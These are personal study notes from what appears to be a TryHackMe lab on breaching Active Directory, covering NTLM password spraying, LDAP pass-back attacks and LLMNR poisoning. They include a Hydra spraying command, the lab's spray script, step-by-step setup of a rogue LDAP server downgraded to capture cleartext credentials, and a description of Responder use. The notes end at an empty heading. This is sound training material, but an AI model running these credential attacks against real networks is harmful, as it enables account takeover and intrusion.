# Task 1: Introduction to AD Breaches
First step is to acquire an inistial set of AD credentials
**IP: 10.5.2.36**

Important to note: the /etc/resolv.conf file defines how the system uses DNS to resolve host names and IP addresses.

[[Configuring DNS]]

wasn't able to properly use the `resolvconf` function so I removed it and just added`search za.tryhackme.com` and `nameserver 10.200.4.101` to my `/etc/resolv.conf` file

# Task 2: OSINT and Phishing
OSINT is used to discover information that has been publicly disclosed
Phishing is scamming people 

websites to check your credentials: [HaveIBeenPwned](https://haveibeenpwned.com) and [DeHashed](https://www.dehashed.com/)

# Task 3: NTLM and NetNTLM
Net Technology LAN Manager (NTLM): suite of security protocols used for user authentication in AD.
NTLM uses a challenge-response-based schemed called NetNTLM.
**Application plays the role of a middle man between the client and AD as **
**NetNTLM can be exposed to the internet**
	mail servers that expose Outlook Web App login portals
	RDP service of a server exposed to the internet
	Exposed VPN endpoints integrated with AD
	Internet-facing web apps

We are using a script to bruteforce the NTLM authentication server
However, I will try using Hydra to bruteforce
`hydra -I -V -L ./usernames.txt -p 'Changeme123' ntlmauth.za.tryhackme.com http-get /`
	`-I` does not read a restore file if present
	`-V` verbose output
	`-L` list of usernames
	`-p` single password
	`http-get /` path to the login page
We get 4 password that are correct

we could've also used the python script provided:
`python3 ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com`

# Task 4: LDAP Bind Credentials
Lightweight Directory Access Protocol (LDAP): Another AD authentication method.
**With LDAP, the application directly verifies user credentials**
	application has a pair of AD credentials that is used to query LDAP and then verify AD user's credentials
LDAP is populer with third-party application that integrate with AD such as: Gitlab, Jenkins, Printers, VPNs

### LDAP Pass-Back Attacks
can be performed when we get access to a device's configuration where LDAP parameters are specified (credentials are usually kept default)

### Creating a rogue LDAP server
Install OpendLDAP
`sudo apt-get -y install slapd ldap-utils`
`sudo systemctl enable slapd`
Reconfigure LDAP server
`sudo dpkg-reconfigure -p low slapd`
`NO: do not skip server configuration`
`DNS name and Organization name: target domain`
`Provide any admin password`
`Select MDB as LDAP database`
`NO: ensure database is not removed when purged`
`YES: move old database files before a new one is created

We need to make our LDAP server vulnerable by downgrading the supported authentication mechanisms
Downgraded Code > olcSaslSecProps.ldif
`#olcSaslSecProps.ldif 
`dn: cn=config 
`replace: olcSaslSecProps`
`olcSaslSecProps: noanonymous,minssf=0,passcred`
	olcSaslSecProps: Specifies SASL security properties
	noanonymous: Disables anonymous login
	minssf: Specifies minimum acceptable security strength to 0

Use ldif file to patch LDAP server using the following:
`sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart

Check LDAP server configuration:
`ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms


# Task 5: Authentication Relays
### Server Message Block
SMB allows workstation to communicate with a file share server
SMB governs everything from inter-network file-saring to remote administration (out of paper alert on your computer is from SMB protocol)
	1. Since NTLM Challenges can be intercepted, you can use offline cracking techniques to recover the password (slower than cracking NTLM hashes)
	2. Use rogue device to stage a man in the middle attack: relays SMB authentication between client and server providing an active authenticated session
### LLMNR, NBT-NS, and WPAD
Will use Responder to perform a Man-in-the-Middle attack by poisoning the responses during NetNTLM authentication.
Responder will attempt to poison any `Link-Local Multicast Name Resolution (LLMNR)`, `NetBIOS Name Server (NBT-NS)`, and `Web Proxy Auto-Discovery (WPAD)` requests that are detected.
	For large scale networks, these services allow hosts to perform their own DNS resolution
	1. Hosts sends out LLMNR requests to determine if host is on the same local network
	2. NBT-NS: precursor protocol to LLMNR
	3. WPAD: attempt to find a proxy for future HTTP connections
Because these protocols rely on broadcasted requests over a local network, our rogue device can also recieve these requests.
[[Responder]] will listen to these requests and attempt to send poisoned requests 
### Intercepting NetNTLM Challenge
